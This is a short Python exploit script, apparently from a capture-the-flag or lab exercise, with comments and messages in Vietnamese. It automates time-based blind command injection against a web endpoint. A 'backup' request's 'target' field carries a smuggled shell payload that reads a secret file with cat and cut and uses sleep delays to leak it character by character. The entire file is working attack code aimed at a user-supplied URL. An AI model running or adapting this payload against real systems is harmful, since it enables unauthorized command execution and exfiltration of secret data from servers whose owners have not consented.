import sys 
import time 
import requests 

def Find_filename(url):
    file_name = ''
    i = 1 
    while True:
        found = False 
        for j in range(32, 127):
            payload = f'abc.zip --help; cmd=`cat /aef15696cd_secret.txt | cut -c {i}`; if [ $cmd = \'{chr(j)}\' ]; then sleep 5; else echo "dung"; fi; #'
            data = {
                'command' : 'backup',
                'target' : payload 
            }
            try:
                start_time = time.time()
                requests.post(url, data=data)
                response_time = time.time() - start_time
            except requests.RequestException as e:
                print(f"[!] Lỗi kết nối: {e}")
                return file_name
            #print(f"Vi tri dang thu {i} va ky tu {chr(j)} -> Ket qua: {res.text}")

            if response_time > 4:
                file_name += chr(j)
                found = True 
                break 
        if not found:
            break
        i = i + 1

        sys.stdout.write("\r[+] FileName: " + file_name)
        sys.stdout.flush()
    print(f"\n[+] Done")
    return file_name


def main():
    if len(sys.argv) != 2: 
        print(f"[+] Usage: {sys.argv[0]} <url>")
        print(f"[+] Example: {sys.argv[0]} http://")
        sys.exit(1)


    url = sys.argv[1]
    print(f"[+] Url Target: {url}")
    file_name = Find_filename(url)
    print(f"Final filename: {file_name}")

if __name__ == "__main__":
    main()